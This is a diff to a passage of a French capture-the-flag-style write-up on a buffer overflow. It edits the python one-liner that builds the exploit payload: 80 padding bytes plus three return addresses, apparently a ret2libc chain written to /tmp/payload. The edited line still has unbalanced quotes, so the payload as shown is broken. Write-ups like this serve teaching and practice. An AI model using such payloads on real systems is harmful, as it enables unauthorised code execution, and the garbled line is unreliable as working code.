@@ -81,7 +81,7 @@ A partir de là nous pouvons créer notre payload :
 
 Ce qui nous donne : 
 
-    $ python -c "print 'A' * 80 + '\xd0\xae\xe6\xf7\ + '\x70\xeb\xe5\xf7\' + '\xed\x97\xf8\xf7\'" > /tmp/payload
+    $ python -c "print 'A' * 80 + '\xd0\xae\xe6\xf7 + '\x70\xeb\xe5\xf7' + '\xed\x97\xf8\xf7'" > /tmp/payload
 
 On ajoute alors la première commande pour accéder au password ce qui nous donne : 
 
